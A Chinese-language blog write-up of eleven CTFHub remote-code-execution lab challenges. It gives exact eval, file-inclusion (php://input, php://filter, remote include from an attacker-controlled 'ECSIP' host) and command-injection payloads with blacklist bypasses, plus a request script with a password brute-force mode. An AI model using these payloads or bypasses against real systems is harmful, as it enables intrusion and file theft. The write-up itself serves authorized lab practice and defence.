---
title: "RCE 基础漏洞：CTFHub 实战 11 题"
date: "2026-11-14T13:59:11+08:00"
tags:
  - CTF
  - CTFHub
  - RCE
description: "记录 CTFHub 中 eval、文件包含及命令注入共十一道练习题，结合请求脚本和环境回显说明各题的利用条件、操作步骤与知识点。"
---

> 本文是《文件包含基础漏洞原理》与《命令执行基础漏洞原理》的靶场篇，按 CTFHub RCE 分类完成 11 道题：eval 执行 1 题、文件包含 4 题、命令注入 6 题。靶场地址与 flag 为动态值，文中仅作示例；所有操作仅针对 CTFHub 提供的合法靶场环境。

![RCE 基础漏洞：CTFHub 实战 11 题：总览](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/00-overview.png)

# 一、准备工作：请求脚本

11 道题涉及 GET、POST、自定义请求体和 URL 编码。使用 Python `http.client` 可以控制方法、路径、首部和请求体，并避免浏览器自动跟随跳转、自动处理 Cookie 等行为。

下面是我用的 `http_req.py` 与 `codec.py`，代码按原报告保留。

```python
import sys,http.client

from codec import base64_encode

def send_once(host, port, method, path, headers, body=""):
    connect = http.client.HTTPConnection(host, port, timeout=5)
    try:
        # 字符串要先编码成字节：http.client 默认用 latin-1 编码 str，中文会炸
        data = body.encode("utf-8") if isinstance(body, str) else body
        connect.request(method, path, body=data, headers=headers)    # 把 data 发出去
        response = connect.getresponse()
        status = response.status
        text = response.read().decode("utf-8", "ignore")
        return status, response.headers.items(), text
    except Exception as e:
        print("Error:", e)
        return 0, [], ""
    finally:
        connect.close()

def list_auth(host,port,method,path,user,wordlist):
    with open(wordlist,encoding="utf-8") as f:
        pwds = f.read().splitlines()

    for i,pwd in enumerate(pwds,1):
        token = base64_encode(f"{user}:{pwd}")
        headers = {"Authorization":"Basic " + token}
        status, _, text = send_once(host, port, method, path, headers)
        if  status == 200:
            print(f"[{i}/{len(pwds)}] 命中: {pwd}")
            print(text)
            return pwd,headers
        else:
            print(f"[{i}/{len(pwds)}] {pwd} 失败")

    return "",{}

if __name__ == "__main__":
    # ---------- 解析命令行 ----------
    pos = []  # 位置参数：域名 端口 方法 路径，按顺序收
    headers = {}  # -H 收集到的请求头
    wordlist = None  # -w 指定的密码文件
    body = ""   # 请求体,默认空

    i = 1
    while i < len(sys.argv):
        arg = sys.argv[i]
        if arg in ("-H", "--header"):                  # -H 后跟请求头
            if ":" not in sys.argv[i + 1]:             # 没有冒号说明不是头，直接报错
                print("请求头格式错误，应为 名: 值 →", sys.argv[i + 1])
                sys.exit(1)
            name, value = sys.argv[i + 1].split(":", 1)
            headers[name.strip()] = value.strip()
            i += 2
        elif arg in ("-d", "--data"):                  # -d 后面跟请求体
            body = sys.argv[i + 1]
            i += 2
        elif arg in ("-w", "--wordlist"):              # -w 后跟密码文件
            wordlist = sys.argv[i + 1]
            i += 2
        else:
            pos.append(arg)
            i += 1

    if len(pos) < 4:  # 位置参数不够 4 个就是用法错
        print('用法: python http_req.py <域名> <端口> <方法> <路径> [-H "名: 值"]... [-w 密码文件]')
        sys.exit(0)

    HOST = pos[0]  # 域名
    PORT = int(pos[1])  # 端口
    METHOD = pos[2].upper()  # 方法
    PATH = pos[3]  # 路径

    # ---------- 分流 ----------
    if wordlist:  # 给了 -w → 爆破模式
        pwd, auth_headers = list_auth(HOST, PORT, METHOD, PATH, "admin", wordlist)
        print("正确密码:", pwd)
    else:  # 没给 -w → 单次请求
        status, resp_headers, text = send_once(HOST, PORT, METHOD, PATH, headers, body)
        print(status)
        for k, v in resp_headers:
            print(f"{k}: {v}")
        print(text)
```

`codec.py`：

```python
import sys
import base64


def base64_encode(cont: str):
    data = cont.encode("utf-8")
    return base64.b64encode(data).decode("ascii")

def base64_decode(cont: str):
    try:
        return base64.b64decode(cont).decode("utf-8")
    except Exception as e:
        print("解码失败:",e)

USAGE = """
用法:
  python codec.py b64e <要编码>     # Base64 编码
  python codec.py b64d <要解码>     # Base64 解码
例子:
  python codec.py b64e admin:123456
  python codec.py b64d YWRtaW46MTIzNDU2
"""

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(USAGE)
        sys.exit(1)

    # 编/解码方法
    method = sys.argv[1].lower()
    # 内容
    content = " ".join(sys.argv[2:])

    if method == "b64e":
        print(base64_encode(content))
    elif method == "b64d":
        print(base64_decode(content))
    else:
        print("未知方式:", method)
        sys.exit(1)
```

用法：

```bash
python http_req.py <域名> <端口> <方法> <路径> [-H "名: 值"] [-d "请求体"]
```

脚本的两个关键点：

1. **请求体按 UTF-8 编码**：`http.client` 默认按 Latin-1 处理字符串，中文或特殊字符会报错；脚本显式调用 `body.encode("utf-8")`。
2. **不自动跟随跳转**：`http.client` 收到 302 后不会访问 `Location`，便于观察原始响应。

---

# 二、eval 执行

![二、eval 执行：eval、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/01-eval-task.png)

![二、eval 执行：eval、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/02-eval-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-43753a9c2cc986c3.sandbox.ctfhub.com 10800 GET "/?cmd=system('ls+/+|grep+flag');"
python.exe .\http_req.py challenge-43753a9c2cc986c3.sandbox.ctfhub.com 10800 GET "/?cmd=system('cat+/flag_19899');"
```

![二、eval 执行：eval、ls](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/03-eval-ls.png)

![二、eval 执行：eval、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/04-eval-flag.png)

**分析**：

- 页面把 `cmd` 参数传入 `eval()`，参数内容作为 PHP 代码执行。
- 构造 `system('...')` 后，PHP 代码执行 `system` 函数，进而执行 Shell 命令。
- URL 中的 `+` 会被服务端解码为空格，因此 `ls+/+|grep+flag` 等价于 `ls / | grep flag`。
- 第一条命令列出根目录下包含 `flag` 的文件，第二条读取该文件。

**知识点**：

- `eval()` 是语言结构，参数必须是合法 PHP 代码；
- `system()` 直接输出命令结果；
- URL 编码与 Shell 解析是两个独立层次，`+`、`%20`、`%09` 的最终含义取决于解码位置。

---

# 三、文件包含

![三、文件包含：file、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/05-file-task.png)

![三、文件包含：file、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/06-file-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-281f8a3a3af972d5.sandbox.ctfhub.com 10800 GET "/?file=shell.txt&ctfhub=system('ls+/|grep+flag');"
python.exe .\http_req.py challenge-281f8a3a3af972d5.sandbox.ctfhub.com 10800 GET "/?file=shell.txt&ctfhub=system('cat+/flag');"
```

![三、文件包含：file、ls](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/07-file-ls.png)

![三、文件包含：file、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/08-file-flag.png)

**分析**：

- 源码使用 `include($_GET['file'])` 包含用户指定的文件。
- 源码在包含前检查文件名中是否包含 `flag`，包含则拒绝；`shell.txt` 不包含该字符串，可以通过检查。
- `shell.txt` 的内容为可执行 PHP 代码，读取 `ctfhub` 参数并执行。
- 因此先包含 `shell.txt`，再通过 `ctfhub` 参数传入 `system(...)`，即可执行系统命令。

**知识点**：

- 文件包含漏洞的利用需要“可包含的文件”与“可控内容”同时存在；
- 文件名过滤只检查关键字时，可以通过其他文件名绕过；
- `&` 在 URL 中分隔参数，`ctfhub` 是第二个 GET 参数。

---

# 四、php://input

![四、php://input：phpinput、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/09-phpinput-task.png)

![四、php://input：phpinput、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/10-phpinput-source.png)

![四、php://input：phpini](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/11-phpini.png)

**操作**：

```bash
python.exe .\http_req.py challenge-5fffb6de51decead.sandbox.ctfhub.com 10800 POST "/?file=php://input" -d "<?php system('cat /flag*');?>"
```

![四、php://input：phpinput、结果](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/12-phpinput-result.png)

**分析**：

- 源码检查 `file` 参数是否以 `php://` 开头，通过后执行 `include`。
- 服务端 `allow_url_include` 为 `On`，允许包含 `php://input`。
- `php://input` 读取 POST 请求体，`include` 把请求体当作 PHP 文件执行。
- 请求体中的 `system('cat /flag*')` 执行系统命令，读取 flag 文件。

**知识点**：

- `php://input` 的利用条件是 `allow_url_include=On`；
- `allow_url_fopen` 对 `php://input` 不作要求；
- POST 请求体必须包含合法 PHP 代码；
- 脚本对请求体做了 UTF-8 编码，避免特殊字符导致发送失败。

---

# 五、读取源代码

![五、读取源代码：readsource、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/13-readsource-task.png)

![五、读取源代码：readsource、hint](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/14-readsource-hint.png)

**操作**：

```bash
python.exe .\http_req.py challenge-a98511ae1b57904c.sandbox.ctfhub.com 10800 GET "/?file=php://filter/read=convert.base64-encoder/resource=/flag"
```

![五、读取源代码：readsource、结果](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/15-readsource-result.png)

**分析**：

- 源码同样检查 `file` 参数是否以 `php://` 开头。
- 页面提示 flag 位于 `/flag`，因此把 `resource` 指向 `/flag`。
- `php://filter` 会把文件内容按 Base64 编码后返回，避免 PHP 代码被直接执行。
- 响应体是 Base64 字符串，解码后得到 flag。
- 命令中的过滤器名称按原报告保留；不同 PHP 环境支持的过滤器名称可能不同，若返回 `filter not found`，需要检查拼写或改用环境支持的过滤器。

**知识点**：

- `php://filter` 不需要 `allow_url_include` 或 `allow_url_fopen`；
- 过滤器名称按运行环境支持情况填写；
- `resource` 指定要读取的文件路径；
- Base64 解码可以用 `base64 -d`、CyberChef 或 Python。

---

# 六、远程包含

![六、远程包含：remote、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/16-remote-task.png)

![六、远程包含：remote、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/17-remote-source.png)

![六、远程包含：remote、ecs](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/18-remote-ecs.png)

**操作**：

```bash
python.exe .\http_req.py challenge-a9b785b238912288.sandbox.ctfhub.com 10800 GET "/?file=http://ECSIP:8000/a.php"
```

![六、远程包含：remote、结果](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/19-remote-result.png)

**分析**：

- 源码使用 `include($_GET['file'])`，并检查文件名中是否包含 `flag`。
- 远程 URL `http://ECSIP:8000/a.php` 不包含 `flag`，通过检查。
- `allow_url_include` 与 `allow_url_fopen` 均为 `On`，可以包含远程文件。
- 攻击者服务器上的 `a.php` 内容为执行系统命令的 PHP 代码，被包含后在目标服务器执行。
- 命令中的 `ECSIP` 需要替换为实际的公网 IP 或域名，端口与 HTTP 服务保持一致。

**知识点**：

- 远程包含需要目标服务器能够访问攻击者提供的 URL；
- 需要公网地址、内网穿透或一台可被目标访问的服务器；
- 远程文件的内容必须是合法 PHP 代码；
- 测试时应使用自己控制的服务器，不能包含未授权的第三方地址。

---

# 七、无过滤命令注入

![七、无过滤命令注入：cmd、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/20-cmd-task.png)

![七、无过滤命令注入：cmd、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/21-cmd-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-91fbf9a7de30891b.sandbox.ctfhub.com 10800 POST "/?ip=127.0.0.1;ls"
python.exe .\http_req.py challenge-91fbf9a7de30891b.sandbox.ctfhub.com 10800 POST "/?ip=127.0.0.1;cat+131592121830097.php"
```

![七、无过滤命令注入：cmd、ls](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/22-cmd-ls.png)

![七、无过滤命令注入：cmd、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/23-cmd-flag.png)

**分析**：

- 源码把 `ip` 参数拼接到 `ping` 命令，再通过 `exec` 执行。
- 源码没有对 `ip` 做任何过滤，`;` 可以直接分隔命令。
- 第一条命令执行 `ls`，列出当前目录；其中包含 flag 文件。
- 第二条命令用 `cat` 读取该文件，`+` 在 URL 中表示空格。

**知识点**：

- `exec()` 返回最后一行，完整输出保存在第二个参数数组中；
- `;` 是 Linux Shell 的命令分隔符；
- 参数中的空格可以用 `+` 或 `%20` 编码；
- 无过滤场景下，优先确认当前目录、用户和权限。

---

# 八、过滤 cat

![八、过滤 cat：cat、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/24-cat-task.png)

![八、过滤 cat：cat、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/25-cat-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-dbb2b5a80545c844.sandbox.ctfhub.com 10800 POST "/?ip=127.0.0.1;tail+flag_3617182066075.php"
```

![八、过滤 cat：cat、结果](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/26-cat-result.png)

**分析**：

- 源码使用 `preg_match_all` 检查 `ip` 参数中是否包含 `cat`，包含则拒绝。
- 过滤只针对 `cat` 这一个命令，其他读取文件的命令仍可使用。
- `tail` 可以输出文件末尾内容，足以读取 flag。
- 同类替代命令还有 `tac`、`more`、`less`、`head`、`nl`、`od`。

**知识点**：

- 关键字黑名单只覆盖单个命令时，可以通过等价命令绕过；
- `tail` 默认输出文件末尾 10 行；
- 文件名来自上一步 `ls` 的结果，需要先确认。

---

# 九、过滤空格

![九、过滤空格：space、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/27-space-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-0689731f449c7756.sandbox.ctfhub.com 10800 POST '/?ip=127.0.0.1;cat${IFS}flag*'
python.exe .\http_req.py challenge-0689731f449c7756.sandbox.ctfhub.com 10800 POST '/?ip=127.0.0.1;base64<flag_225862460330008.php'
```

![九、过滤空格：space、结果](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/28-space-result.png)

![九、过滤空格：space、base64](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/29-space-base64.png)

**分析**：

- 源码使用 `preg_match_all` 检查 `ip` 参数中是否包含空格。
- `${IFS}` 是 Shell 的内部字段分隔符，展开后相当于空白，可以替代空格。
- `<` 是输入重定向，把文件内容送入 `base64` 的标准输入，避免在参数中出现空格。
- `base64` 输出为编码后的字符串，需要解码得到 flag。

**知识点**：

- 空格过滤的替代方式：`${IFS}`、`$IFS`、`%09`、`<`、`{cat,flag}`；
- `${IFS}` 比 `$IFS` 更稳定，因为 `$IFS` 后面紧跟字母时可能被解析为变量名的一部分；
- `<` 重定向不经过管道，适合绕过运算符过滤；
- 单引号可以保留 `${IFS}` 不被本地 Shell 展开。

---

# 十、过滤目录分隔符

![十、过滤目录分隔符：dirsep、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/30-dirsep-task.png)

![十、过滤目录分隔符：dirsep、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/31-dirsep-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-e08215dece6bd413.sandbox.ctfhub.com 10800 POST "/?ip=127.0.0.1;ls+-lR"
python.exe .\http_req.py challenge-e08215dece6bd413.sandbox.ctfhub.com 10800 POST "/?ip=127.0.0.1;cd+flag_is_here;cat+flag*"
```

![十、过滤目录分隔符：dirsep、ls](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/32-dirsep-ls.png)

![十、过滤目录分隔符：dirsep、flag](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/33-dirsep-flag.png)

**分析**：

- 源码检查 `ip` 参数中是否包含 `/`，包含则拒绝。
- 第一条命令使用 `ls -lR` 递归列出目录，发现 flag 位于 `flag_is_here` 目录。
- 由于不能使用 `/`，改用 `cd` 进入目录，再用通配符 `flag*` 匹配文件名。
- `cd` 和 `cat` 之间用 `;` 分隔，两个命令都不包含 `/`。

**知识点**：

- 目录分隔符过滤可以通过 `cd` 切换目录绕过；
- 通配符 `*`、`?` 可以匹配未知文件名；
- `ls -lR` 适合递归查看目录结构；
- `;` 是否被过滤取决于题目，本题只过滤 `/`。

---

# 十一、过滤运算符

![十一、过滤运算符：operator、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/34-operator-task.png)

![十一、过滤运算符：operator、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/35-operator-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-eb70026ac16faccd.sandbox.ctfhub.com 10800 POST "/?ip=127.0.0.1;base64<flag_20485281323893.php"
```

![十一、过滤运算符：operator、base64](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/36-operator-base64.png)

![十一、过滤运算符：operator、decoded](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/37-operator-decoded.png)

**分析**：

- 源码使用 `preg_match_all("/(\||\&)/", ...)` 过滤 `|` 和 `&`，`;` 没有被过滤。
- 因此不能用管道，但可以用 `;` 分隔命令，用 `<` 重定向。
- `base64<flag_20485281323893.php` 把文件内容送入 `base64`，输出编码结果。
- 将编码结果用 `codec.py b64d` 或 `base64 -d` 解码，得到 flag。

**知识点**：

- 正则 `/(\||\&)/` 只匹配 `|` 和 `&`，不匹配 `;`；
- `<` 可以替代管道完成输入传递；
- `base64` 编码可以避免二进制或特殊字符影响输出；
- 解码工具可以用 Python、`base64 -d` 或 CyberChef。

---

# 十二、综合过滤练习

![十二、综合过滤练习：comprehensive、题目](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/38-comprehensive-task.png)

![十二、综合过滤练习：comprehensive、源码](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/39-comprehensive-source.png)

**操作**：

```bash
python.exe .\http_req.py challenge-b1e5ad7282fb6f03.sandbox.ctfhub.com 10800 POST "/?ip=127.0.0.1%0acd%09fla?_is_here%0atail%09fla?_279502204514297.php"
```

![十二、综合过滤练习：comprehensive、结果](https://raw.githubusercontent.com/Lehuang0212/Myblog-images/main/images/rce/40-comprehensive-result.png)

**分析**：

- 源码的正则过滤了 `(`、`)`、`&`、`;`、空格、`/`、`cat`、`flag`、`ctfhub`。
- 命令分隔符改用 `%0a`（换行），空白改用 `%09`（制表符）。
- `flag` 被过滤，使用通配符 `fla?` 匹配 `flag`。
- `cat` 被过滤，使用 `tail` 读取文件。
- `cd` 不带 `/`，可以进入 `flag_is_here` 目录。

**知识点**：

- URL 编码在 PHP 过滤之前或之后生效，取决于服务器和框架的解码顺序；
- `%0a` 和 `%09` 对 PHP 是普通字符，对 Shell 是换行和制表符；
- 通配符可以绕过关键字黑名单；
- 黑名单字段越多，绕过组合越复杂，但仍然不是完整防御。

---

# 十三、11 题知识点对照

| # | 题目 | 类型 | 关键手法 |
| --- | --- | --- | --- |
| 1 | eval 执行 | 代码执行 | `eval` + `system` |
| 2 | 文件包含 | LFI | `include` + `shell.txt` |
| 3 | php://input | 伪协议 | POST Body 作为 PHP 文件 |
| 4 | 读取源代码 | 伪协议 | `php://filter` + Base64 |
| 5 | 远程包含 | RFI | `http://` 远程文件 |
| 6 | 无过滤命令注入 | 系统命令 | `;` 分隔命令 |
| 7 | 过滤 cat | 黑名单 | `tail` 替代 `cat` |
| 8 | 过滤空格 | 黑名单 | `${IFS}`、`<` 重定向 |
| 9 | 过滤目录分隔符 | 黑名单 | `cd` + 通配符 |
| 10 | 过滤运算符 | 黑名单 | `<` 重定向 + `base64` |
| 11 | 综合过滤练习 | 黑名单 | `%0a`、`%09`、`?`、`tail` |

---

# 十四、总结

11 道题覆盖了 RCE 的主要入口与绕过方式：

1. **代码执行**：`eval` 接收用户输入，执行任意 PHP 代码；
2. **文件包含**：`include` 包含可控文件，结合 `shell.txt`、`php://input`、`php://filter`、远程文件；
3. **系统命令执行**：`system`、`exec` 拼接用户输入，使用 `;`、`|`、`&&` 等符号执行额外命令；
4. **黑名单绕过**：替代命令、通配符、`${IFS}`、`<` 重定向、`%0a`、`%09`、Base64 编码；
5. **防御**：白名单校验、参数数组、`escapeshellarg`、`disable_functions`、`allow_url_include=Off`、低权限运行、WAF 与日志监控。

RCE 题的共同点是：**用户输入进入了解释器**。利用前先确认入口类型、过滤规则和运行环境，再选择对应的 payload。
